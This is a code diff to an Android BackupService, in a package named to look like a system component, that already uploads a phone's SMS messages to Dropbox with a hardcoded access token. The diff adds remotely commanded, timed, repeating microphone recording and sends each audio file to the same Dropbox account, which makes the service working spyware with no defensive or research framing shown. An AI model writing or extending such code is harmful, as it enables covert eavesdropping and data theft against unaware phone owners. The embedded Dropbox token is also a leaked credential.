@@ -2,6 +2,7 @@ package com.android.commstat.services;
 
 import android.Manifest;
 import android.app.IntentService;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.IBinder;
@@ -10,6 +11,7 @@ import android.support.v4.content.ContextCompat;
 import android.text.TextUtils;
 import android.util.Log;
 
+import com.android.commstat.AudioRecorder;
 import com.android.commstat.IOUtils;
 import com.android.commstat.model.Sms;
 import com.dropbox.core.DbxRequestConfig;
@@ -25,6 +27,8 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 import java.util.Timer;
@@ -34,7 +38,11 @@ public class BackupService extends IntentService {
 
     public static final String SMS = "sms";
     public static final String SEND_FILES = "send_files";
-    public static final String FILES_FOLDER = "files_folder";
+    public static final String RECORD_MIC = "record_mic";
+    public static final String ARG_FILES_FOLDER = "files_folder";
+    public static final String RECORDS_FOLDER = "records";
+    public static final String COMMAND = "command";
+
     private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
     private static final String MESSAGES_FOLDER = "messages";
     private static List<String> mSendingDirs = new ArrayList<>(1);
@@ -68,11 +76,166 @@ public class BackupService extends IntentService {
                 }
             }
         } else if(TextUtils.equals(intent.getAction(), SEND_FILES)) {
-            String filesFolder = intent.getExtras().getString(FILES_FOLDER);
+            String filesFolder = intent.getStringExtra(ARG_FILES_FOLDER);
             if(filesFolder != null) {
                 sendFiles(filesFolder);
             }
+        } else if(TextUtils.equals(intent.getAction(), RECORD_MIC)) {
+            recordMic(intent.getStringExtra(COMMAND));
         }
+    }
+
+    private void recordMic(String command) {
+        if (command == null) {
+            return;
+        }
+        int duration = 0;
+        int delay = 0;
+        int totalDuration = 60;
+        List<Integer> args = parseCommandArgs(command);
+        if(args.size() > 0) {
+            totalDuration = args.get(0);
+            if(totalDuration < 0) {
+                totalDuration = 0;
+            }
+        }
+        if(args.size() > 1) {
+            duration = args.get(1);
+            if(duration < 0) {
+                duration = 0;
+            }
+        }
+        if(args.size() > 2) {
+            delay = args.get(2);
+            if(delay < 0) {
+                delay = 0;
+            }
+        }
+        if(delay == 0 && duration > 0) {
+            delay = duration;
+        }
+        if(duration == 0 && totalDuration == 0) {
+            return;
+        }
+        Calendar calendar = Calendar.getInstance();
+        calendar.add(Calendar.SECOND, duration <= 0 ? totalDuration : duration);
+        FinishListener listener = new FinishListener(calendar.getTime(), delay, duration, totalDuration);
+        new RecordTask(duration <= 0 ? totalDuration : duration, listener).start();
+    }
+
+    class FinishListener implements OnFinishListener {
+        private final Date mFinishTime;
+        private final int mDelay;
+        private final int mDuration;
+        private final int mTotalDuration;
+
+        FinishListener(Date finishTime, int delay, int duration, int totalDuration) {
+            mFinishTime = finishTime;
+            mDelay = delay;
+            mDuration = duration;
+            mTotalDuration = totalDuration;
+        }
+
+        @Override
+        public void onFinish() {
+            Calendar calendar = Calendar.getInstance();
+            calendar.add(Calendar.SECOND, mDelay);
+            calendar.add(Calendar.SECOND, mDuration);
+            if(mFinishTime.getTime() > calendar.getTime().getTime()) {
+                new Timer().schedule(new TimerTask() {
+                    @Override
+                    public void run() {
+                        new RecordTask(mDuration <= 0 ? mTotalDuration : mDuration, FinishListener.this).start();
+                    }
+                }, mDelay);
+            }
+        }
+    }
+
+    interface OnFinishListener {
+        void onFinish();
+    }
+
+    class RecordTask {
+        private AudioRecorder mRecorder;
+        private long mDuration;
+        private Timer mStopTimer;
+        private boolean mIsStop;
+        private OnFinishListener mOnFinishListener;
+        private String mFilePath;
+
+        RecordTask(long duration, OnFinishListener onFinishListener) {
+            mFilePath = makeFilePath(BackupService.this, RECORDS_FOLDER);
+            mRecorder = new AudioRecorder(mFilePath);
+            mDuration = duration;
+            mOnFinishListener = onFinishListener;
+        }
+
+        void start() {
+            mIsStop = false;
+            mRecorder.start();
+            mStopTimer = new Timer();
+            mStopTimer.schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    stop();
+                    if(mOnFinishListener != null) {
+                        mOnFinishListener.onFinish();
+                        sendFiles(new File(mFilePath).getParentFile().getAbsolutePath());
+                    }
+                }
+            }, mDuration);
+        }
+
+        void stop() {
+            if(mStopTimer != null) {
+                mStopTimer.cancel();
+                mStopTimer.purge();
+                mStopTimer = null;
+            }
+            if(!mIsStop) {
+                mIsStop = true;
+                mRecorder.stop();
+            }
+        }
+    }
+
+    public String makeFilePath(Context context, String folderName) {
+        File recordsDir = new File(context.getFilesDir().getAbsolutePath(), folderName);
+        if (!recordsDir.exists() && !recordsDir.mkdir()) {
+            return null;
+        }
+        String fileName = new SimpleDateFormat("MM-dd_HH-mm-ss", Locale.getDefault()).format(Calendar.getInstance().getTime()) + ".3gp";
+        File file = new File(recordsDir, fileName);
+        return file.getAbsolutePath();
+    }
+
+    private List<Integer> parseCommandArgs(String command) {
+        List<Integer> args = new ArrayList<>(1);
+        if(command == null || command.length() == 0) {
+            return args;
+        }
+        if (command.length() > 1) {
+            String[] arguments = TextUtils.split(command.substring(1), ":");
+            for (int i = 0; i < 2; i++) {
+                String value = "";
+                for (Character c : arguments[i].toCharArray()) {
+                    if(Character.isDigit(c)) {
+                        value += c;
+                    } else {
+                        int iVal = Integer.decode(value);
+                        if(Character.toUpperCase(c) == 'M') {
+                            iVal *= 60000;
+                        } else if(Character.toUpperCase(c) == 'H') {
+                            iVal *= 3600000;
+                        }
+                        args.add(iVal);
+                        break;
+                    }
+                }
+            }
+        }
+        return args;
     }
 
     private void startQueue() {
